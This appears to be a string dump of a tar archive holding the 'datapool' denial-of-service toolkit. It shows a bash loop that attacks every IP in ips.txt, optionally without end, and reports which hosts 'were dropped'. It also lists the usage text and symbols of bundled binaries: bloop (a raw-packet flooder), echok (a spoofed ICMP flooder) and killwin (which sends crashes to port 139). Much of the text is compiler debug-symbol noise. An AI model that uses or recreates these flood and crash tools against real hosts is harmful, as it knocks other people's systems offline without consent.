            "    echo \"[-t]: Number of simultaneous attacks to launch. ex: -t 4\"",
            "    echo \"[-r]: Run this attack only. ex: -r onetwothreefour\"",
            "    echo \"      Note: attacknames can be found in datapool.fc\"",
            "    exit 1",
            "LOOPATK=0",
            "while getopts p:v:l:i:xask OPTION ; do",
            "    case \"$OPTION\" in",
            "    a) LOOPATK=1 ;;",
            "   \\?) usage2 ;;",
            "   esac",
            "done",
            "clear",
            "trap \"rm -f ./output.txt ; rm -f ./output2.txt ; rm -rf ./svcname.txt ; ./cleaner.sh ; exit 1\" 1 2 3 15",
            "if [ \"$LOOPATK\" = \"0\" ]; then",
            "    echo \"Beginning attack...\"",
            "    while read ATTACKIP",
            "    do",
            "\techo \"Attacking $ATTACKIP...\"",
            "\t./datapool.sh $@ -d $ATTACKIP 1>/dev/null 2>/dev/null",
            "\tcase $? in",
            "\t0) echo \"$ATTACKIP was dropped by $LASTATTACK\" ;;",
            "\t1) echo \"There was an error running the script...exiting.\" ; exit 1 ;;",
            "\t2) echo \"$ATTACKIP was not avaliable.\" ;;",
            "\t4) echo \"The following ports are open on $ATTACKIP:\" ; cat ./output.txt ;;",
            "\t5) echo \"$ATTACKIP was attacked, but is still alive...\" ;;",
            "\tesac",
            "    done < \"./ips.txt\"",
            "    echo \"Attack completed.\"",
            "else",
            "    echo \"Beginning attack...\"",
            "    while true; do",
            "\twhile read ATTACKIP",
            "\t    echo \"Attacking $ATTACKIP...\"",
            "\t    ./datapool.sh $@ -d $ATTACKIP 1>/dev/null 2>/dev/null",
            "\t    case $? in",
            "\t    0) echo \"$ATTACKIP was dropped by $LASTATTACK\" ;;",
            "    \t    1) echo \"There was an error running the script...exiting.\" ; exit 1 ;;",
            "\t    2) echo \"$ATTACKIP was not avaliable.\" ;;",
            "\t    4) echo \"The following ports are open on $ATTACKIP:\" ; cat ./output.txt ;;",
            "\t    5) echo \"$ATTACKIP was attacked, but is still alive...\" ;;",
            "\t    esac",
            "\tdone < \"./ips.txt\"",
            "    done",
            "    echo \"Attack completed.\"",
            "datapool/bin/",
            "0040755",
            "0000000",
            "0000000",
            "00000000000",
            "07101433237",
            "012133",
            "ustar  ",
            "root",
            "root",
            "datapool/bin/bloop",
            "0100755",
            "0000000",
            "0000000",
            "00000034050",
            "07100656566",
            "013206",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "malloc",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "sendto",
            "memset",
            "gethostbyname",
            "stderr",
            "htons",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "QVhl",
            "E1fE",
            "fE1fu",
            "e[^]",
            "U$Sj$_",
            "EEEE",
            "Ej$j",
            "UMfY",
            "j\tEP",
            "Pz u",
            "UMfY",
            "j$EPE",
            "U()}",
            "E hB",
            "EEEPj",
            "EPEPEP",
            "\u0403;u[]",
            "Bloop v 1.0",
            " usage:",
            "./bloop [src_ip] [dst_ip] [# of packets]",
            " [ip_src] :  ex: 205.56.78.0",
            " [ip_dst] :  ex: 201.12.3.76",
            " [number]  : 100",
            "Legion2000 Security Research (c)",
            "ERROR: Unable to resolve host %s",
            "ERROR: Opening raw socket.",
            "Status: Connected....packets sent.",
            "ERROR: Unable to Connect To luser.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "bloop.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "resolve",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "banner",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "send_winbomb",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/echok",
            "0100755",
            "0000000",
            "0000000",
            "00000044005",
            "07100656577",
            "013167",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "random",
            "memcpy",
            "perror",
            "optarg",
            "strtoul",
            "socket",
            "fflush",
            "bzero",
            "fprintf",
            "__deregister_frame_info",
            "setsockopt",
            "optind",
            "sendto",
            "bcopy",
            "getopt",
            "memset",
            "inet_ntoa",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRhd",
            "E1fE",
            "fE1fu",
            "e[^]",
            "t&h>",
            "EntPn",
            "stpw",
            "WVS}",
            ")+f\u01c5f)\u028bQ",
            "81fR",
            "$PPh",
            "8PPW ",
            "x[^_]",
            "PEPQ",
            "\u028bE)\u0409",
            "Uu'h9",
            "E5t&",
            "PEPO",
            "iE@E",
            "\u028bE)\u0409",
            "Uu'h9",
            "\u0403;u[]",
            "                  * ICMP ECHO Killer [v%s] - by Zakath *",
            "               * Code based on works by Crisk & Mike Muuss *",
            "usage:",
            "%s [-f <-n number>] [-s packet size] [-w wait] <spoof> <dest>",
            "\t-f          : enable flooding  (ping -f)",
            "\t-n <number> : number of pings to send",
            "\t-s <size>   : ICMP_ECHO Packet Size [Default is 64]",
            "\t-w <time>   : Wait time between packets [Default is 100]",
            "\t<spoof>     : address of fake ICMP packet sender",
            "\t<dest>      : destination of the flood message",
            "error: can't resolve the %s.",
            "dest address",
            "spoof address",
            "# target address          : %s (%s)",
            "# spoof-from address      : %s (%s)",
            "# number of packets       : %u",
            "# icmp echo packet size   : %u",
            "# wait time between send  : %u",
            "fn:s:w:",
            "%s: Invalid Number '%s'.",
            "%s: Bad Packet Size '%s'",
            "%s: Bad Wait Time '%s'",
            "%s: missing parameters",
            "We have IP_HDRINCL! =] ",
            "setsockopt IP_HDRINCL",
            "%s: error sending ping packet",
            "flooding... packet limit set.",
            "%s: error sending packet",
            "flooding completed - %u packets sent.",
            "flooding. each dot equals 25 packets.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "echok.c",
            "resolve_one",
            "resolve_all",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "spoof_addr",
            "dest_name",
            "resolve",
            "bcopy@@GLIBC_2.0",
            "dest_addr",
            "inet_ntoa@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "pingsize",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "parse_args",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "banner",
            "icmp_echo_send",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "spoofaddr",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "pingnmbr",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "give_info",
            "flood",
            "htons@@GLIBC_2.0",
            "strtoul@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "destaddr",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "addr_to_ulong",
            "spoof_name",
            "__data_start",
            "socket@@GLIBC_2.0",
            "pingsleep",
            "optind@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/killwin",
            "0100755",
            "0000000",
            "0000000",
            "00000032654",
            "07100656621",
            "013544",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "memcpy",
            "perror",
            "socket",
            "send",
            "__deregister_frame_info",
            "strcmp",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh",
            ":-u#h",
            "t)EP",
            "\u0403;u[]",
            "Later.",
            "Usage: %s <target> [-p port (Default 139)] [-t hits (Default 1)]",
            "Must specify a target.",
            "Resolving",
            "socket",
            "connect",
            "Connected to [%s:%d].",
            "Sending crash %d times...",
            "Done....",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
